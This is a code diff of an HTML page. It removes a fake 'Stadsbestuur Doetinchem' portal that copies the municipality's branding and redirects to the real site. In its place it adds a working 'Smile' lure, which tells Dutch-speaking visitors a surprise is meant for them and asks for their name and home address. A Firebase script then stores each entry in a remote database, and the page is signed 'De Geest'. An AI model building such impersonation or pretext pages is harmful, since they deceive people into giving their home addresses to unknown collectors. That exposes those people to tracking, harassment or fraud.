@@ -3,80 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stadsbestuur Doetinchem | Officiële Portaal</title>
-    <meta name="description" content="Welkom bij het portaal van het Stadsbestuur Doetinchem. Informatie over gemeentelijke diensten, bestuur en actuele zaken in de gemeente Doetinchem.">
-    <meta name="keywords" content="Stadsbestuur, Stadbestuur, Doetinchem, Gemeente Doetinchem, Bestuur, Overheid, Portaal">
-    <meta name="author" content="Stadsbestuur Doetinchem">
-    <meta property="og:title" content="Stadsbestuur Doetinchem">
-    <meta property="og:description" content="Officiële toegang tot de diensten van de Gemeente Doetinchem.">
-    <meta property="og:type" content="website">
-    <style>
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            overflow: hidden; background-color: #0d1117;
-            color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex; align-items: center; justify-content: center;
+    <title>Smile 😊</title>
+<style>
+        * {
+            box-sizing: border-box;
         }
 
-        #particles-js { position: absolute; width: 100%; height: 100%; z-index: 1; }
-        .content {
-            position: relative; z-index: 2; text-align: center;
-            background: rgba(22, 27, 34, 0.9); padding: 50px;
-            border-radius: 15px; border: 1px solid #30363d;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
-            max-width: 500px; width: 90%;
-            animation: slideUp 1s ease-out;
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #ffd700, #fff2a6);
+            font-family: Arial, sans-serif;
         }
 
-        .logo { width: 160px; margin-bottom: 30px; }
-
-        h1 { font-size: 1.8rem; margin-bottom: 10px; font-weight: 600; color: #58a6ff; }
-        p { font-size: 1.1rem; color: #8b949e; margin-bottom: 25px; }
-
-        .loader-bar {
-            width: 150px; height: 3px; background: #30363d;
-            margin: 0 auto; border-radius: 5px; overflow: hidden;
-        }
-        .loader-fill {
-            width: 0%; height: 100%; background: #238636;
-            animation: load 3.5s linear forwards;
+        .container {
+            width: 100%;
+            max-width: 430px;
+            background: white;
+            padding: 35px;
+            border-radius: 18px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.12);
         }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+        h1 {
+            margin-top: 0;
+            color: #333;
         }
-        @keyframes load { to { width: 100%; } }
+
+        p {
+            color: #555;
+            line-height: 1.6;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ffd700;
+        }
+
+        button {
+            width: 100%;
+            margin-top: 18px;
+            padding: 13px;
+            border: none;
+            border-radius: 8px;
+            background: #ffd700;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        button:hover {
+            opacity: 0.95;
+        }
+
+        #message {
+            display: none;
+        }
+
+        .signature {
+            margin-top: 25px;
+            font-weight: bold;
+        }
     </style>
 </head>
-<body>
-    <div id="particles-js"></div>
-    <div class="content">
-        <img src="https://cuatro.sim-cdn.nl/doetinchem/uploads/2023-11/gemeente-doetinchem.svg" alt="Gemeente Doetinchem" class="logo">
-        <h1>Stadsbestuur Doetinchem</h1>
-        <p>U wordt doorverwezen naar de officiële website van de gemeente...</p>
-        <div class="loader-bar">
-            <div class="loader-fill"></div>
-        </div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-    <script>
-        particlesJS('particles-js', {
-            "particles": {
-                "number": { "value": 99 },
-                "color": { "value": ["#58a6ff", "#ffffff"] },
-                "shape": { "type": "circle" },
-                "opacity": { "value": 0.3 },
-                "size": { "value": 2, "random": true },
-                "move": { "enable": true, "speed": 1.5, "direction": "none", "random": true }
-            }
-        });
 
-        document.title = "Stadsbestuur Doetinchem | Officiële Website";
-        const targetURL = "https://www.doetinchem.nl";
-        setTimeout(() => {
-            window.location.href = targetURL;
-        }, 3301);
+<body>
+
+<div class="container" id="formContainer">
+
+    <h1>😊 Smile</h1>
+
+    <p>
+        Wat bijzonder dat u deze glimlach hebt ontdekt!
+    </p>
+
+    <p>
+        Niet iedereen komt deze pagina tegen.
+        Sterker nog, deze glimlach was eigenlijk voor u bedoeld.
+
+    </p>
+
+    <p>
+        Laat hieronder uw gegevens achter,
+        zodat uw verrassing de juiste bestemming bereikt.
+    </p>
+
+    <input type="text" id="name" placeholder="Naam">
+    <input type="text" id="address" placeholder="Adres">
+
+    <button onclick="submitForm()">Verzenden</button>
+
+</div>
+
+<div class="container" id="message"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDXIty5TGVNu37oLDYtWFjgA-pLcnqgEmU",
+            authDomain: "nl-team.firebaseapp.com",
+            projectId: "nl-team",
+            databaseURL: "https://nl-team-default-rtdb.europe-west1.firebasedatabase.app",
+            storageBucket: "nl-team.firebasestorage.app",
+            messagingSenderId: "165944460560",
+            appId: "1:165944460560:web:7435e881c6823413d3d195"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.submitForm = function () {
+            const name = document.getElementById("name").value.trim();
+            const address = document.getElementById("address").value.trim();
+
+            if (!name || !address) {
+                alert("Vul je naam en adres in.");
+                return;
+            }
+
+            push(ref(db, "submissions/"), {
+                name,
+                address,
+                timestamp: new Date().toISOString()
+            })
+            .then(() => {
+                document.getElementById("formContainer").style.display = "none";
+
+                document.getElementById("message").innerHTML = `
+                    <h2>Gefeliciteerd, ${name}!</h2>
+
+<p>
+    Uw glimlach is succesvol geregistreerd.
+</p>
+
+<p>
+    Hartelijk dank voor het invullen van uw gegevens.
+</p>
+
+<p>
+    Uw verrassing zal binnenkort haar bestemming bereiken.
+</p>
+
+<p class="signature">
+    Met vriendelijke groet,<br>
+    De Geest
+</p>
+`;
+                document.getElementById("message").style.display = "block";
+            })
+            .catch(error => {
+                alert("Er is een fout opgetreden: " + error.message);
+            });
+        };
     </script>
+
 </body>
 </html>
